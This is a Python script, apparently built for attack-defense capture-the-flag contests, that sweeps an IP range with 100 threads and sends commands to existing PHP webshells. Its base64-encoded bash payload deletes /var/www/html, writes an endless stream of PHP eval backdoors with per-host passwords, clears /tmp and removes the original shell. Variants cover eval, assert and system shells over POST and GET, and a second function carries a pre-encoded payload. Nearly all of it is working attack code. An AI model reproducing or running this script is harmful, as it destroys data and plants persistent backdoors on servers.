import base64
import hashlib

import requests
from config import *
from utils.Mutithread import *
from utils.nealwe_web_lib import *


def ip_list(x):
    ipList = []
    iplist = x.split('.')
    if '-' in x:
        for i in iplist:
            d = i
            if '-' in d:
                p = iplist.index(d)
                l = d.split('-')
                m = int(l[0])
                n = int(l[1])
        for j in range(m, n + 1):
            iplist[p] = str(j)
            ip = '.'.join(iplist)
            ipList.append(ip)
        ipList = sorted(set(ipList), key=ipList.index)  # 去重
    else:
        ip = '.'.join(iplist)
        ipList.append(ip)
        ipList = sorted(set(ipList), key=ipList.index)
    return ipList


def md5(s):
    m = hashlib.md5()
    m.update(s.encode())
    return m.hexdigest()


def transshell(content):
    a = base64.b64encode(content.encode('utf-8'))
    return a.decode('utf-8')


# def exec_shell_command(ip, port, ):#OK
#     # url = "http://"+str(ip)+shell_path+get_arg
#     url = "http://" + str(ip) + shell_path
#     shell_password = md5("jspi" + str(ip) + "nealwe_NEALWE")
#     text = "<?php @eval(\$_POST['{}']);".format(shell_password)
#     bash_content = """#!/bin/bash
#     let i=0;
#     while [[ $i -le 10000000 ]];
#     do
#         echo "{0}">/var/www/html/${{i}}.php;
#         let i++;
#     done;""".format(text)
#     bash_content = transshell(bash_content)
#     cmd = "(echo " + bash_content + " | base64 -d) > /var/www/html/start.sh;chmod 777 /var/www/html/start.sh;bash /var/www/html/start.sh"
#     data = {post_arg: "system('" + cmd + "');"}
#     try:
#         response = requests.post(url, data=data, timeout=4)
#         if response.status_code == 200:
#             print("------------" + str(ip) + "-----------")
#             print(response.text)
#         else:
#             print("------------" + str(ip) + "-----------")
#             print("response.status_code:" + str(response.status_code))
#     except BaseException as e:
#         print("------------" + str(ip) + "-----------")
#         print(e)


def getshell(thread_name, ip, port, shell_path_uri, method, shell_function, shell_password):
    url = f"http://{ip}:{port}/{shell_path_uri}"
    # --------------------------------------------- #
    new_shell_password = md5("jspi" + str(ip) + "nealwe_NEALWE")
    text = "<?php @eval(\$_POST['{}']);".format(new_shell_password)
    bash_content = """#!/bin/bash
rm -rf /var/www/html/*
let i=0;
while [[ $i -le 1000000000 ]];
do 
    echo "{0}">{1}/${{i}}.php;
    let i++;
done;""".format(text, Rpath)
    bash_content = transshell(bash_content)
    cmd = "(echo " + bash_content + " | base64 -d) > /tmp/start.sh;chmod 777 /tmp/start.sh;/bin/bash /tmp/start.sh;rm -rf /tmp/*;rm -f /var/www/html/" + str(shell_path_uri).split('?')[0] + ";"

    if shell_function == "assert":
        # TODO 测试失败
        data = {
            shell_password: f"eval(base64_decode($_POST[z0]))",
            "z0": transshell("system('" + cmd + "');")
        }
    elif shell_function == "eval":
        data = {
            'a': 'eval',
            shell_password: f"system('{cmd}');"
        }
        # data = {"pass": "lazywz..happy", shell_password: f"system('{cmd}');"}
    elif shell_function == "system":
        data = {shell_password: cmd}

    if method == "POST":
        try:
            print(url)
            print(data)
            print(requests.post(url=url, headers=headers_from_string_dict(headers), data=data, timeout=10).text)
            print(f"send to {ip}.....")
        except Exception as e:
            print(e)
            print("[-] %s Shell has already been Deleted" % url)


    elif method == "GET":
        try:
            requests.get(url, params=data, timeout=10)
            print(f"send to {ip}.....")
        except:
            print("[-] %s Shell has already been Deleted" % url)

    elif method == "混合":
        # $_POST[a]($_GET[shell_password]);
        try:
            requests.post(url, params=data, data={'a': 'system'}, timeout=10)
            print(f"send to {ip}.....")
        except:
            print("[-] %s Shell has already been Deleted" % url)

    else:
        print("method error!")


    return 0

def getshell2(thread_name, ip, port, shell_path_uri, method, shell_function, shell_password):
    url = f"http://{ip}:{port}/{shell_path_uri}"
    # --------------------------------------------- #
    new_shell_password = md5("jspi" + str(ip) + "nealwe_NEALWE")
    url = f"http://4.4.{ip}.100:8001/admin/config.php?2=system"
    data = """1=(echo IyEvYmluL2Jhc2gKICAgICAgICBsZXQgaT0wOwogICAgICAgIHdoaWxlIFtbICRpIC1sZSAxMDAwMDAwMDAwIF1dOwogICAgICAgIGRvIAogICAgICAgICAgICBlY2hvICI8P3BocCBAZXZhbChcJF9QT1NUWydhYWIyZDlmZjQyNTg0ODQ3OGZiYmJiZTMwYTA2MTE5NyddKTsiPi92YXIvd3d3L2h0bWwvJHtpfS5waHA7CiAgICAgICAgICAgIGxldCBpKys7CiAgICAgICAgZG9uZTs= | base64 -d) > /tmp/start.sh;chmod 777 /tmp/start.sh;/bin/bash /tmp/start.sh
    """
    try:
        requests.post(url, data, timeout=2)
    except:
        pass

if __name__ == "__main__":
    while True:
        pool = ThreadPool(100)
        # 创建100个任务，让线程池进行处理
        for ip in ip_list(ips):
            pool.put(getshell, (ip, port, shell_path_uri, method, shell_function, shell_password,), callback)
        # 等待一定时间，让线程执行任务
        time.sleep(3)
        print("-" * 50)
        print("\033[32;0m任务停止之前线程池中有%s个线程，空闲的线程有%s个！\033[0m"
              % (len(pool.generate_list), len(pool.free_list)))
        # 正常关闭线程池
        pool.close()
        print("任务执行完毕，正常退出！")
        # 强制关闭线程池
        pool.terminate()
        print("强制停止任务！")

    # pool = ThreadPool(500)
    # # 创建100个任务，让线程池进行处理
    # for ip in ip_list(ips):
    #     pool.put(getshell, (ip, port, shell_path_uri, method, shell_function, shell_password,), callback)
    #     # pool.put(getshell2, (ip, port, shell_path_uri, method, shell_function, shell_password,), callback)
    # # 等待一定时间，让线程执行任务
    # time.sleep(3)
    # print("-" * 50)
    # print("\033[32;0m任务停止之前线程池中有%s个线程，空闲的线程有%s个！\033[0m"
    #       % (len(pool.generate_list), len(pool.free_list)))
    # # 正常关闭线程池
    # pool.close()
    # print("任务执行完毕，正常退出！")
    # # 强制关闭线程池
    # pool.terminate()
    # print("强制停止任务！")